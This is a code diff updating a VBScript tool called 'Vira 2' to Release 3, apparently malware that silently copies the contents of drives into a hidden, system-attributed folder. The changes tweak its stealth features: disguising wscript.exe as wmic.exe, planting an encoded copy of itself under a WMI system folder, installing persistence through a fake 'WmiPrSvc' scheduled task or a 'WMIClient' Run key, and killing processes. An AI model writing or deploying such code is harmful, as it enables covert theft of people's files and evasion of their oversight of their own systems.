@@ -4,9 +4,9 @@
 '*******************
 Option Explicit
 On Error Resume Next
-Const ViraVersion = "2.23 R2"
+Const ViraVersion = "2.23 R3"
 Const ViraTitle = "Vira 2"
-Const ViraDescription = "Vira 2.23 Super Edition Release 2"
+Const ViraDescription = "Vira 2.23 Super Edition Release 3"
 
 ' System
 Dim Shell, Fso, IsAdmin
@@ -98,7 +98,7 @@ End If
 '***********
 Sub ViraInitialize
   ReadConfig
-  Shell.Run "CMD.EXE /C MKDIR """ & Destination & """"
+  Shell.Run "CMD.EXE /C MKDIR """ & Destination & """", 0, True
   Set Container = Fso.GetFolder(Destination)
   Container.Attributes = 7
   Dim i
@@ -135,10 +135,10 @@ Function DriveProcess(DriveLetter)
       End If
     Next
     
-    If Len(Drive.VolumeName) = 0 Then
-      Target = Destination & ConvertHex(Drive.SerialNumber) & "\"
-    Else
+    If Len(Drive.VolumeName) > 0 Then
       Target = Destination & ConvertHex(Drive.SerialNumber) & "_" & Drive.VolumeName & "\"
+    Else
+      Target = Destination & ConvertHex(Drive.SerialNumber) & "\"
     End If
     RTarget = ReverseDir & ConvertHex(Drive.SerialNumber) & "\"
     If Not Fso.FolderExists(Target) Then
@@ -254,7 +254,7 @@ Function WriteConfig()
   Config.WriteLine FlagFileNames
   Config.WriteLine CapacityGB
   Config.WriteLine Destination
-  Config.WriteLine Destination & "Reverse\"
+  'Config.WriteLine Destination & "Reverse\"
   Config.WriteLine "XEOF"
   Config.Close
   WriteConfig = True
@@ -273,7 +273,7 @@ Function InstallLocal(Silent, UseScheduledTask)
   If Not AdminCheck() Then
     Exit Function
   End If
-  Shell.Run "TASKKILL.EXE /F /IM nhclient.exe", 0, True
+  Shell.Run "TASKKILL.EXE /F /IM wmic.exe", 0, True
   If Not Silent Then
     DefaultConfig
     InstallPrompt
@@ -286,7 +286,7 @@ Function InstallLocal(Silent, UseScheduledTask)
   Else
     Fso.CopyFile SysDir & "\wscript.exe", SysDir & "\wmic.exe", True
   End If
-  If Fso.FileExists("screnc.exe") Then
+  If Fso.FileExists(Fso.GetParentFolderName(WScript.ScriptFullName) & "screnc.exe") Then
     Shell.Run "screnc.exe /s """ & WScript.ScriptName & """ vtemp.vbe", 0, True
     Fso.CopyFile Fso.GetParentFolderName(WScript.ScriptFullName) & "\vtemp.vbe", "C:\Windows\system32\Wbem\Performance\WmiApRpl.vbe", True
     Fso.DeleteFile Fso.GetParentFolderName(WScript.ScriptFullName) & "\vtemp.vbe", True
@@ -295,14 +295,14 @@ Function InstallLocal(Silent, UseScheduledTask)
   End If
   If UseScheduledTask Then
     Shell.Run "SCHTASKS.EXE /Create /SC ONSTART /F /TN WmiPrSvc /TR " & _
-              """'C:\Windows\system32\wmic.exe' 'C:\Windows\system32\Wbem\Performance\WmiApRpl.vbe' xwh-yz""", 0, True
+              """'C:\Windows\system32\wmic.exe' 'C:\Windows\system32\Wbem\Performance\WmiApRpl.vbe'""", 0, True
     Shell.RegDelete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WMIClient"
   Else
     Shell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WMIClient", _
-                   "C:\Windows\system32\wmic.exe C:\Windows\system32\Wbem\Performance\WmiApRpl.vbe xwh-yz", "REG_SZ"
+                   "C:\Windows\system32\wmic.exe C:\Windows\system32\Wbem\Performance\WmiApRpl.vbe", "REG_SZ"
   End If
   MsgBox "Installation Complete!", 64, ViraTitle
-  Shell.Run "C:\Windows\system32\wmic.exe C:\Windows\system32\Wbem\Performance\WmiApRpl.vbe xwh-yz", 0, False
+  Shell.Run "C:\Windows\system32\wmic.exe C:\Windows\system32\Wbem\Performance\WmiApRpl.vbe", 0, False
   InstallLocal = 0
 End Function
 
